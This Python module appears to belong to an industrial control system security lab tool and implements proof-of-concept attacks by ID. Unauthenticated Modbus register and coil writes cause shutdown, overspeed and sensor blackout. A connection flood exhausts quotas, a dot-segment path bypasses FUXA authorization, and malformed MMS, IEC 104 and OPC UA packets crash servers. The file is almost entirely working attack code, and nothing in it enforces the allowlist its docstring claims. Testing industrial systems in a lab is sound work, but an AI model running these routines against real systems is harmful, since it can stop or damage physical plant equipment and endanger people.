"""Built-in lab PoCs executed in-process against allowlisted targets.

Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""

from __future__ import annotations

import asyncio
import struct
from typing import Dict

from ..lab import MALFORMED_IEC104, MALFORMED_MMS, MALFORMED_OPCUA
from ..protocols.modbus import FC_WRITE_SINGLE_COIL, FC_WRITE_SINGLE_REGISTER


async def _tcp_exchange(host: str, port: int, payload: bytes, timeout: float = 3.0) -> bytes:
    """Send one TCP payload and read a bounded reply."""
    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=timeout)
    try:
        writer.write(payload)
        await writer.drain()
        try:
            return await asyncio.wait_for(reader.read(1024), timeout=timeout)
        except asyncio.TimeoutError:
            return b""
    finally:
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:  # noqa: BLE001
            pass


def _mbap(pdu: bytes, unit: int = 1, tid: int = 1) -> bytes:
    """Wrap a Modbus PDU."""
    return struct.pack(">HHHB", tid, 0, len(pdu) + 1, unit) + pdu


async def write_register(host: str, port: int, address: int, value: int) -> bytes:
    """FC06 write single holding register."""
    pdu = bytes((FC_WRITE_SINGLE_REGISTER,)) + struct.pack(">HH", address, value & 0xFFFF)
    return await _tcp_exchange(host, port, _mbap(pdu))


async def write_coil(host: str, port: int, address: int, on: bool) -> bytes:
    """FC05 write single coil."""
    raw = 0xFF00 if on else 0x0000
    pdu = bytes((FC_WRITE_SINGLE_COIL,)) + struct.pack(">HH", address, raw)
    return await _tcp_exchange(host, port, _mbap(pdu))


async def flood_connections(host: str, port: int, count: int) -> int:
    """Open many short-lived TCP connections to exercise quotas."""
    opened = 0
    writers = []
    try:
        for _ in range(max(1, min(count, 64))):
            try:
                _reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=2.0)
            except (OSError, asyncio.TimeoutError):
                break
            writers.append(writer)
            opened += 1
    finally:
        for writer in writers:
            writer.close()
    return opened


async def http_raw_get(host: str, port: int, raw_path: str, authorization: str = "") -> bytes:
    """Issue HTTP/1.1 GET using the raw path string (dot-segments preserved)."""
    headers = [
        "GET %s HTTP/1.1" % raw_path,
        "Host: %s:%s" % (host, port),
        "Connection: close",
    ]
    if authorization:
        headers.append("Authorization: %s" % authorization)
    request = ("\r\n".join(headers) + "\r\n\r\n").encode("ascii")
    return await _tcp_exchange(host, port, request)


async def run_internal(attack_id: str, host: str, port: int, extra: Dict[str, str]) -> Dict[str, object]:
    """Dispatch an in-tree PoC. Returns evidence fields."""
    if attack_id in {"BFP-001-shutdown", "DELTA-UNAUTH-STOP"}:
        reply = await write_register(host, port, 0, 0)
        return {"ok": bool(reply), "reply_hex": reply.hex()}
    if attack_id in {"BFP-002-overspeed", "DELTA-UNAUTH-SPEED"}:
        reply = await write_register(host, port, 7, 1000)
        return {"ok": bool(reply), "reply_hex": reply.hex()}
    if attack_id in {"BFP-003-sensor-blackout"}:
        first = await write_register(host, port, 2, 0)
        second = await write_register(host, port, 3, 0)
        return {"ok": bool(first and second)}
    if attack_id in {"BFP-004-coil-stop"}:
        reply = await write_coil(host, port, 0, False)
        return {"ok": bool(reply), "reply_hex": reply.hex()}
    if attack_id in {"DELTA-CONN-EXHAUST"}:
        opened = await flood_connections(host, port, int(extra.get("count") or 24))
        return {"ok": opened > 0, "opened": opened}
    if attack_id in {"FUXA-PATH-BYPASS"}:
        reply = await http_raw_get(host, port, "/api/./users")
        bypassed = b"operator" in reply and b"unauthorized" not in reply.lower()
        return {"ok": True, "bypassed": bypassed, "status_line": reply.split(b"\r\n", 1)[0].decode("ascii", "replace")}
    if attack_id in {"IEC61850-MALFORMED"}:
        reply = await _tcp_exchange(host, port, MALFORMED_MMS)
        return {"ok": True, "crashed": reply == b"", "reply": reply.decode("ascii", "replace")}
    if attack_id in {"IEC60870-MALFORMED"}:
        reply = await _tcp_exchange(host, port, MALFORMED_IEC104)
        return {"ok": True, "crashed": reply == b"", "reply": reply.decode("ascii", "replace")}
    if attack_id in {"OPEN62541-MALFORMED"}:
        reply = await _tcp_exchange(host, port, MALFORMED_OPCUA)
        return {"ok": True, "crashed": reply == b"", "reply": reply.decode("ascii", "replace")}
    raise ValueError("no internal handler for %s" % attack_id)
